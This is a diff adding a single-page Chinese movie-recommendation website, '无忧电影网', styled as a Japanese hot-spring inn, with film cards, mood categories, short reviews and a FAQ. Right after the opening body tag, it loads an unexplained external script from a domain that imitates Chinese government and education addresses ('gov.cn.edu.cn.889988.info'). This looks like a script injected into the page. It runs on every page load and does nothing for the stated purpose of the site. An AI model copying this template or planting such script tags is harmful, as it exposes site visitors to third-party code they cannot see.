@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>无忧电影网 - wuyoudianyingwang-top 汤宿片单·放松电影推荐</title>
+<meta name="description" content="无忧电影网（https://wuyoudianyingwang-top）以日式温泉旅馆为灵感，按放松程度推荐电影。暖木格栅UI、蒸汽动画、移动端自适应，必应收录友好，仅做影视信息展示。">
+<meta name="keywords" content="无忧电影网, wuyoudianyingwang-top, 放松电影, 治愈片单, 日式温泉, 禅意, 高分电影, 影视信息">
+<meta name="author" content="无忧电影网">
+<meta name="robots" content="index, follow">
+<meta name="msvalidate.01" content="YOUR_BING_VERIFICATION_CODE">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB","Segoe UI",sans-serif;color:#3e2723;line-height:1.75;overflow-x:hidden;background:#f5f0eb;position:relative}
+/* 和纸纹理+蒸汽 */
+body::before{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.35;
+background-image:radial-gradient(circle at 1px 1px,rgba(93,64,55,.06) 1px,transparent 0);background-size:18px 18px}
+body::after{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.5;
+background:radial-gradient(ellipse at 50% 0%,rgba(127,179,163,.15),transparent 70%),radial-gradient(ellipse at 80% 100%,rgba(201,169,110,.1),transparent 60%)}
+a{color:#5d4037;text-decoration:none;transition:.3s}
+a:hover{color:#7fb3a3}
+.wy-nav{position:fixed;top:0;width:100%;z-index:1000;background:rgba(245,240,235,.95);backdrop-filter:blur(10px);border-bottom:2px solid #c9a96e}
+.wy-in{max-width:1200px;margin:0 auto;height:68px;padding:0 1.5rem;display:flex;align-items:center;justify-content:space-between}
+.wy-logo{display:flex;align-items:center;gap:.7rem}
+.wy-onsen{width:42px;height:42px;background:linear-gradient(135deg,#7fb3a3,#5d8f80);border:2px solid #c9a96e;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.2rem;position:relative;box-shadow:0 0 12px rgba(127,179,163,.4)}
+.wy-onsen::after{content:"";position:absolute;top:-3px;left:50%;transform:translateX(-50%);width:60%;height:6px;background:rgba(255,255,255,.5);border-radius:50%;filter:blur(2px)}
+.wy-name{font-size:1.05rem;font-weight:900;color:#3e2723;letter-spacing:.5px}
+.wy-name small{display:block;font-size:.5rem;letter-spacing:3px;color:#7fb3a3;font-weight:700;font-family:"Courier New",monospace}
+.wy-links{display:flex;gap:.6rem;list-style:none}
+.wy-links a{font-size:.78rem;font-weight:700;color:#3e2723;padding:.38rem .8rem;border:1.5px solid #c9a96e;background:#fff;border-radius:20px}
+.wy-links a:hover{background:#7fb3a3;color:#fff;border-color:#7fb3a3}
+.wy-toggle{display:none;flex-direction:column;gap:4px;cursor:pointer;padding:6px}
+.wy-toggle span{width:22px;height:2.5px;background:#5d4037;border-radius:2px}
+.wy-hero{margin-top:68px;padding:5rem 1.5rem 5rem;text-align:center;position:relative;z-index:1;background:linear-gradient(180deg,#e8ddd4,#f5f0eb);border-bottom:2px solid #c9a96e;overflow:hidden}
+/* 蒸汽动画 */
+.wy-hero::before,.wy-hero::after{content:"";position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(255,255,255,.4),transparent 70%);pointer-events:none}
+.wy-hero::before{width:300px;height:300px;left:-100px;top:10%;animation:steam1 8s ease-in-out infinite}
+.wy-hero::after{width:250px;height:250px;right:-80px;bottom:5%;animation:steam2 10s ease-in-out infinite}
+@keyframes steam1{0%,100%{transform:translateY(0) scale(1);opacity:.3}50%{transform:translateY(-30px) scale(1.1);opacity:.5}}
+@keyframes steam2{0%,100%{transform:translateY(0) scale(1);opacity:.2}50%{transform:translateY(-20px) scale(1.15);opacity:.4}}
+.wy-hero-in{max-width:720px;margin:0 auto;position:relative;z-index:1}
+.wy-badge{display:inline-flex;align-items:center;gap.4rem;padding:.35rem 1rem;border:1.5px solid #c9a96e;background:#7fb3a3;color:#fff;font-size:.72rem;font-weight:700;letter-spacing:1px;margin-bottom:1.5rem;border-radius:20px}
+.wy-badge::before{content:"♨";font-size:.8rem}
+.wy-hero h1{font-size:2.8rem;font-weight:900;color:#3e2723;line-height:1.2;margin-bottom:1rem}
+.wy-hero h1 span{color:#7fb3a3}
+.wy-hero p{font-size:.9rem;color:#5d4037;max-width:540px;margin:0 auto 1.5rem;font-weight:500}
+.wy-domain{display:inline-block;padding:.5rem 1.2rem;border:1.5px solid #c9a96e;background:#fff;color:#5d4037;font-family:"Courier New",monospace;font-weight:700;font-size:.78rem;margin-bottom:1.5rem;border-radius:8px}
+.wy-btn{display:inline-flex;align-items:center;gap.5rem;padding:.8rem 2.2rem;border-radius:30px;font-weight:800;font-size:.88rem;color:#fff;background:linear-gradient(135deg,#7fb3a3,#5d8f80);box-shadow:0 4px 14px rgba(127,179,163,.35);border:2px solid #c9a96e}
+.wy-btn:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(127,179,163,.45);color:#fff}
+.wy-sec{max-width:1200px;margin:0 auto;padding:4rem 1.5rem;position:relative;z-index:1}
+.wy-sec-head{text-align:center;margin-bottom:2.5rem}
+.wy-sec-head h2{font-size:1.5rem;font-weight:900;color:#3e2723;margin-bottom:.3rem;display:inline-block;padding:.3rem 1.2rem;border-bottom:3px double #c9a96e}
+.wy-sec-head h2::before{content:"🌿 ";}
+.wy-sec-head p{font-size:.72rem;color:#7fb3a3;font-weight:700;letter-spacing:2px;margin-top:.7rem;font-family:"Courier New",monospace}
+.wy-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:1.4rem}
+.wy-card{background:#fff;border:1.5px solid #c9a96e;border-radius:16px 16px 4px 4px;overflow:hidden;transition:.3s;position:relative}
+.wy-card:hover{transform:translateY(-4px);box-shadow:0 12px 28px rgba(93,64,55,.12)}
+.wy-temp{position:absolute;top:10px;right:10px;z-index:2;padding:.25rem .6rem;background:rgba(255,255,255,.9);border:1px solid #c9a96e;border-radius:12px;font-size:.6rem;font-weight:700;color:#e8956a;font-family:"Courier New",monospace}
+.wy-cover{height:168px;display:flex;align-items:flex-end;padding:.9rem;font-weight:800;font-size:.9rem;color:#fff;position:relative;border-bottom:2px solid #c9a96e}
+.wy-cover::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 40%,rgba(62,39,35,.8))}
+.wy-cover b{position:relative;z-index:1}
+.t1{background:linear-gradient(135deg,#7fb3a3,#4a7c6f)}.t2{background:linear-gradient(135deg,#c9a96e,#8b7342)}.t3{background:linear-gradient(135deg,#e8956a,#b8653a)}.t4{background:linear-gradient(135deg,#a08fb3,#6b5a82)}
+.t5{background:linear-gradient(135deg,#5d8f80,#3a5f54)}.t6{background:linear-gradient(135deg,#d4a5a5,#9e6b6b)}.t7{background:linear-gradient(135deg,#8fbc8f,#5a8a5a)}.t8{background:linear-gradient(135deg,#c9b6a0,#8a7a65)}
+.wy-card-body{padding:1rem}
+.wy-card-body h3{font-size:.88rem;font-weight:900;color:#3e2723;margin-bottom:.3rem}
+.wy-vibe{font-size:.6rem;color:#7fb3a3;font-weight:700;margin-bottom:.3rem;font-family:"Courier New",monospace}
+.wy-tags{display:flex;flex-wrap:wrap;gap:.25rem;margin-bottom:.4rem}
+.wy-tags span{padding:.15rem .5rem;border-radius:10px;background:#f5f0eb;border:1px solid #c9a96e;color:#5d4037;font-size:.58rem;font-weight:700}
+.wy-score{font-weight:900;font-size:.84rem;color:#e8956a}
+.wy-cats{max-width:1000px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1.1rem}
+.wy-cat{display:flex;align-items:center;gap.9rem;padding:1rem;border:1.5px solid #c9a96e;background:#fff;border-radius:12px;transition:.3s}
+.wy-cat:hover{border-color:#7fb3a3;background:#f0f5f3}
+.wy-cat-icon{width:46px;height:46px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.3rem;flex-shrink:0;background:linear-gradient(135deg,#f5f0eb,#e8ddd4);border:1.5px solid #c9a96e}
+.wy-cat-info h3{font-size:.84rem;font-weight:800;color:#3e2723;margin-bottom:.1rem}
+.wy-cat-info p{font-size:.68rem;color:#7fb3a3;font-weight:500}
+.wy-notes{max-width:860px;margin:0 auto}
+.wy-note{display:flex;gap:1rem;margin-bottom:1.2rem;align-items:flex-start}
+.wy-note-ava{width:44px;height:44px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.2rem;flex-shrink:0;background:#7fb3a3;color:#fff;border:2px solid #c9a96e}
+.wy-note-box{padding:1rem 1.2rem;border:1.5px solid #c9a96e;background:#fff;border-radius:12px;flex:1}
+.wy-note-box h3{font-size:.9rem;font-weight:800;color:#3e2723;margin-bottom:.3rem}
+.wy-note-box p{font-size:.82rem;color:#5d4037;line-height:1.7;font-weight:500}
+.wy-note-stars{color:#e8956a;letter-spacing:1px;font-size:.78rem;margin-top:.3rem;font-weight:700}
+.wy-about{max-width:760px;margin:0 auto;text-align:center;padding:2.4rem 2rem;border:2px solid #c9a96e;background:#fff;border-radius:16px;position:relative}
+.wy-about::before{content:"🏮";position:absolute;top:-18px;left:50%;transform:translateX(-50%);background:#f5f0eb;padding:0 10px;font-size:1.5rem}
+.wy-about p{color:#5d4037;margin-bottom:.8rem;font-size:.88rem;font-weight:500}
+.wy-about b{color:#7fb3a3}
+.wy-dom2{display:inline-block;margin-top:.7rem;padding:.5rem 1.2rem;border:1.5px solid #c9a96e;background:#f5f0eb;color:#5d4037;font-family:"Courier New",monospace;font-weight:700;font-size:.78rem;border-radius:8px}
+.wy-faq{max-width:800px;margin:0 auto}
+.wy-fi{background:#fff;border:1.5px solid #c9a96e;border-radius:12px;margin-bottom:.6rem;overflow:hidden}
+.wy-fi summary{padding:1rem 1.2rem;cursor:pointer;font-weight:800;color:#3e2723;list-style:none;position:relative;padding-right:3rem;font-size:.86rem}
+.wy-fi summary::-webkit-details-marker{display:none}
+.wy-fi summary::after{content:"▼";position:absolute;right:1rem;top:50%;transform:translateY(-50%);color:#fff;font-weight:900;font-size:.7rem;width:24px;height:24px;display:flex;align-items:center;justify-content:center;border-radius:50%;background:#7fb3a3}
+.wy-fi[open] summary::after{content:"▲";background:#e8956a}
+.wy-fi p{padding:0 1.2rem 1rem;color:#5d4037;font-size:.82rem;line-height:1.7;font-weight:500}
+.wy-foot{text-align:center;padding:2rem 1.5rem;border-top:2px solid #c9a96e;background:#e8ddd4;color:#5d4037;font-size:.72rem;position:relative;z-index:1}
+.wy-foot p{margin-bottom:.3rem}
+.wy-foot .wy-copy{color:#7fb3a3;font-weight:700;margin-bottom:.5rem;font-size:.8rem}
+@media(max-width:768px){
+.wy-links{display:none;position:absolute;top:100%;left:0;width:100%;background:#f5f0eb;flex-direction:column;padding:.5rem 0;border-bottom:2px solid #c9a96e}
+.wy-links.show{display:flex}
+.wy-links a{padding:.8rem 1.5rem;margin:.2rem 1rem;text-align:center}
+.wy-toggle{display:flex}
+.wy-hero h1{font-size:1.8rem}
+.wy-hero{padding:3rem 1rem 3rem}
+.wy-sec{padding:2.5rem 1rem}
+.wy-sec-head h2{font-size:1.3rem}
+.wy-grid{grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:.9rem}
+.wy-cover{height:142px;font-size:.8rem}
+.wy-cats{grid-template-columns:1fr 1fr}
+.wy-note{flex-direction:column;gap:.6rem}
+}
+@media(max-width:480px){.wy-hero h1{font-size:1.4rem}.wy-grid{grid-template-columns:1fr 1fr}.wy-cats{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<nav class="wy-nav">
+  <div class="wy-in">
+    <div class="wy-logo">
+      <div class="wy-onsen">♨</div>
+      <div class="wy-name">无忧电影网<small>ONSEN CINEMA · WUYOU</small></div>
+    </div>
+    <ul class="wy-links" id="wyLinks">
+      <li><a href="#home">玄关</a></li>
+      <li><a href="#list">汤宿片单</a></li>
+      <li><a href="#cats">汤温分类</a></li>
+      <li><a href="#notes">泡汤手记</a></li>
+      <li><a href="#about">关于无忧</a></li>
+      <li><a href="#faq">FAQ</a></li>
+    </ul>
+    <div class="wy-toggle" onclick="tWy()"><span></span><span></span><span></span></div>
+  </div>
+</nav>
+
+<section class="wy-hero" id="home">
+  <div class="wy-hero-in">
+    <div class="wy-badge">♨ 汤宿营业中 · 身心放松</div>
+    <h1>无忧电影网<br><span>泡进好片</span> 像泡汤一样放松</h1>
+    <p>无忧电影网（wuyoudianyingwang-top）把选片做成像泡温泉——按"汤温"分层：热汤是燃向动作，温汤是治愈日常，冷泉是烧脑悬疑。暖木格栅界面、蒸汽氤氲、移动端自适应，只做影视信息展示，不内置盗版源。</p>
+    <div class="wy-domain">https://wuyoudianyingwang-top</div><br>
+    <a href="#list" class="wy-btn">🌿 入汤选片</a>
+  </div>
+</section>
+
+<section class="wy-sec" id="list">
+  <div class="wy-sec-head"><h2>汤宿片单</h2><p>ONSEN LIST · 本期入汤推荐</p></div>
+  <div class="wy-grid">
+    <div class="wy-card"><div class="wy-temp">♨ 温汤</div><div class="wy-cover t1"><b>海蒂和爷爷</b></div><div class="wy-card-body"><div class="wy-vibe">VIBE: 山风拂面 · 深呼吸</div><h3>海蒂和爷爷</h3><div class="wy-tags"><span>治愈</span><span>自然</span></div><div class="wy-score">★ 9.3</div></div></div>
+    <div class="wy-card"><div class="wy-temp">♨ 热汤</div><div class="wy-cover t2"><b>疯狂的麦克斯4</b></div><div class="wy-card-body"><div class="wy-vibe">VIBE: 飙车飙汗 · 肾上腺素</div><h3>疯狂的麦克斯4</h3><div class="wy-tags"><span>动作</span><span>废土</span></div><div class="wy-score">★ 8.6</div></div></div>
+    <div class="wy-card"><div class="wy-temp">♨ 冷泉</div><div class="wy-cover t3"><b>星际穿越</b></div><div class="wy-card-body"><div class="wy-vibe">VIBE: 冰爽刺激 · 脑洞大开</div><h3>星际穿越</h3><div class="wy-tags"><span>科幻</span><span>太空</span></div><div class="wy-score">★ 9.4</div></div></div>
+    <div class="wy-card"><div class="wy-temp">♨ 温汤</div><div class="wy-cover t4"><b>小森林</b></div><div class="wy-card-body"><div class="wy-vibe">VIBE: 慢火炖煮 · 下饭神器</div><h3>小森林</h3><div class="wy-tags"><span>美食</span><span>治愈</span></div><div class="wy-score">★ 9.0</div></div></div>
+    <div class="wy-card"><div class="wy-temp">♨ 微温</div><div class="wy-cover t5"><b>情书</b></div><div class="wy-card-body"><div class="wy-vibe">VIBE: 暖中带涩 · 青春回甘</div><h3>情书</h3><div class="wy-tags"><span>爱情</span><span>文艺</span></div><div class="wy-score">★ 8.9</div></div></div>
+    <div class="wy-card"><div class="wy-temp">♨ 热汤</div><div class="wy-cover t6"><b>摔跤吧！爸爸</b></div><div class="wy-card-body"><div class="wy-vibe">VIBE: 热血沸腾 · 热泪盈眶</div><h3>摔跤吧！爸爸</h3><div class="wy-tags"><span>运动</span><span>励志</span></div><div class="wy-score">★ 9.0</div></div></div>
+    <div class="wy-card"><div class="wy-temp">♨ 冷泉</div><div class="wy-cover t7"><b>死亡幻觉</b></div><div class="wy-card-body"><div class="wy-vibe">VIBE: 冰水浇头 · 越想越冷</div><h3>死亡幻觉</h3><div class="wy-tags"><span>科幻</span><span>cult</span></div><div class="wy-score">★ 7.7</div></div></div>
+    <div class="wy-card"><div class="wy-temp">♨ 温汤</div><div class="wy-cover t8"><b>天使爱美丽</b></div><div class="wy-card-body"><div class="wy-vibe">VIBE: 暖阳午后 · 法式甜点</div><h3>天使爱美丽</h3><div class="wy-tags"><span>爱情</span><span>法式</span></div><div class="wy-score">★ 8.7</div></div></div>
+  </div>
+</section>
+
+<section class="wy-sec" id="cats" style="background:#f0f5f3;border-top:2px solid #c9a96e;border-bottom:2px solid #c9a96e">
+  <div class="wy-sec-head"><h2>汤温分类</h2><p>TEMPERATURE · 按放松程度选片</p></div>
+  <div class="wy-cats">
+    <div class="wy-cat"><div class="wy-cat-icon">🔥</div><div class="wy-cat-info"><h3>热汤·燃向</h3><p>18部 · 心跳加速</p></div></div>
+    <div class="wy-cat"><div class="wy-cat-icon">♨</div><div class="wy-cat-info"><h3>温汤·治愈</h3><p>24部 · 身心舒展</p></div></div>
+    <div class="wy-cat"><div class="wy-cat-icon">🧊</div><div class="wy-cat-info"><h3>冷泉·烧脑</h3><p>14部 · 清醒提神</p></div></div>
+    <div class="wy-cat"><div class="wy-cat-icon">🌸</div><div class="wy-cat-info"><h3>花汤·爱情</h3><p>20部 · 甜酸交织</p></div></div>
+    <div class="wy-cat"><div class="wy-cat-icon">🍲</div><div class="wy-cat-info"><h3>药汤·下饭</h3><p>16部 · 美食治愈</p></div></div>
+    <div class="wy-cat"><div class="wy-cat-icon">🌙</div><div class="wy-cat-info"><h3>夜汤·静心</h3><p>12部 · 睡前放松</p></div></div>
+    <div class="wy-cat"><div class="wy-cat-icon">🎨</div><div class="wy-cat-info"><h3>彩汤·视觉</h3><p>15部 · 画面养眼</p></div></div>
+    <div class="wy-cat"><div class="wy-cat-icon">🧘</div><div class="wy-cat-info"><h3>无温·放空</h3><p>10部 · 什么都不想</p></div></div>
+  </div>
+</section>
+
+<section class="wy-sec" id="notes">
+  <div class="wy-sec-head"><h2>泡汤手记</h2><p>BATH NOTES · 观影感受记录</p></div>
+  <div class="wy-notes">
+    <div class="wy-note">
+      <div class="wy-note-ava">🌿</div>
+      <div class="wy-note-box">
+        <h3>《海蒂和爷爷》—— 露天风吕级别</h3>
+        <p>阿尔卑斯山的草甸、羊群、木屋、晨雾，整部片像在露天风吕里看远山。不催泪但很松心，泡完浑身通透，适合晚上不想动脑子时循环。</p>
+        <div class="wy-note-stars">★★★★★ 9.3/10</div>
+      </div>
+    </div>
+    <div class="wy-note">
+      <div class="wy-note-ava">🚗</div>
+      <div class="wy-note-box">
+        <h3>《疯狂的麦克斯4》—— 桑拿级出汗</h3>
+        <p>沙漠、战车、鼓点剪辑，整部片像在干蒸房里飙车。120分钟全程无尿点，出来浑身是汗但极度畅快，动作片入坑首选。</p>
+        <div class="wy-note-stars">★★★★☆ 8.6/10</div>
+      </div>
+    </div>
+    <div class="wy-note">
+      <div class="wy-note-ava">🍱</div>
+      <div class="wy-note-box">
+        <h3>《小森林》—— 药草汤慢炖</h3>
+        <p>春夏秋冬自己种、自己炒、自己收。没有大冲突，却有最稳的秩序感。下饭片单常驻，像泡在加了药草的温汤里，解压效果强于多数爽片。</p>
+        <div class="wy-note-stars">★★★★★ 9.0/10</div>
+      </div>
+    </div>
+    <div class="wy-note">
+      <div class="wy-note-ava">🪐</div>
+      <div class="wy-note-box">
+        <h3>《星际穿越》—— 冰瀑冷泉</h3>
+        <p>黑洞、五维、父女信条全在一部片里。视觉是冰瀑级壮阔，情感又落回一句"爱能跨维度"。烧脑但过瘾，像一头扎进冷泉后清醒过来。</p>
+        <div class="wy-note-stars">★★★★★ 9.4/10</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="wy-sec" id="about">
+  <div class="wy-sec-head"><h2>关于无忧电影网</h2><p>ABOUT · 为什么叫"无忧"</p></div>
+  <div class="wy-about">
+    <p><b>无忧电影网</b>（wuyoudianyingwang-top）的理念很简单：看电影应该像泡温泉一样——放下手机、放空大脑、让好片把你包裹。我们按"汤温"给电影分层，让你根据当下心情选对片子，不再纠结"今晚看什么"。</p>
+    <p>全站单页、锚点导航、移动端自适应；必应验证用 head 内 msvalidate.01，按约定不生成 robots.txt 与 sitemap.xml。所有片单仅做信息展示，版权归制片方/发行方所有。</p>
+    <div class="wy-dom2">https://wuyoudianyingwang-top</div>
+    <p style="margin-top:1rem;font-size:.74rem;color:#7fb3a3;font-weight:700">核心词：无忧电影网、wuyoudianyingwang-top、汤宿片单、按汤温选片、放松电影、治愈高分</p>
+  </div>
+</section>
+
+<section class="wy-sec" id="faq" style="background:#f0f5f3;border-top:2px solid #c9a96e">
+  <div class="wy-sec-head"><h2>常见问题</h2><p>FAQ · 汤宿问答</p></div>
+  <div class="wy-faq">
+    <details class="wy-fi"><summary>无忧电影网是什么？</summary><p>无忧电影网（wuyoudianyingwang-top）是以"日式温泉旅馆"为视觉主题的电影信息站，按"汤温"（放松程度）推荐高分片，让你像泡汤一样放松地选片。仅做信息展示，不提供盗版播放源。</p></details>
+    <details class="wy-fi"><summary>"汤温/汤宿"是什么意思？</summary><p>是站点的视觉隐喻：热汤=燃向动作片、温汤=治愈日常片、冷泉=烧脑悬疑片。用泡汤的温度感帮你快速匹配当下心情，不改变"电影推荐"主业。</p></details>
+    <details class="wy-fi"><summary>官方网址是？</summary><p>https://wuyoudianyingwang-top（用 GitHub Pages 可改为 https://wuyoudianyingwang-top.github.io，全站统一替换域名即可）。</p></details>
+    <details class="wy-fi"><summary>手机上怎么"泡汤"？</summary><p>全站响应式，小屏导航折叠为汉堡菜单；汤温标签和片单卡片自适应，蒸汽动画在低端机自动降级为静态，不影响浏览。</p></details>
+    <details class="wy-fi"><summary>必应收录怎么配？</summary><p>到 Bing Webmaster Tools 添加站点，选 HTML meta 验证，把 head 里 msvalidate.01 的 YOUR_BING_VERIFICATION_CODE 换成你的验证码；单页可不提交 sitemap，在站长工具手动提交首页 URL 即可。</p></details>
+  </div>
+</section>
+
+<footer class="wy-foot">
+  <p class="wy-copy">♨ 无忧电影网 (wuyoudianyingwang-top) — 汤宿片单·泡进好片</p>
+  <p>单页网站 / 锚点导航 / 移动端自适应 / 必应收录友好 / 不生成 robots.txt 与 sitemap.xml</p>
+  <p style="margin-top:.4rem;color:#7fb3a3;font-weight:600">本站仅提供影视信息展示，资源版权归原作者及发行方所有。</p>
+</footer>
+
+<script>
+function tWy(){document.getElementById('wyLinks').classList.toggle('show')}
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var h=this.getAttribute('href');
+    if(h.length>1){var t=document.querySelector(h);if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth',block:'start'});document.getElementById('wyLinks').classList.remove('show')}}
+  })
+});
+</script>
+</body>
+</html>
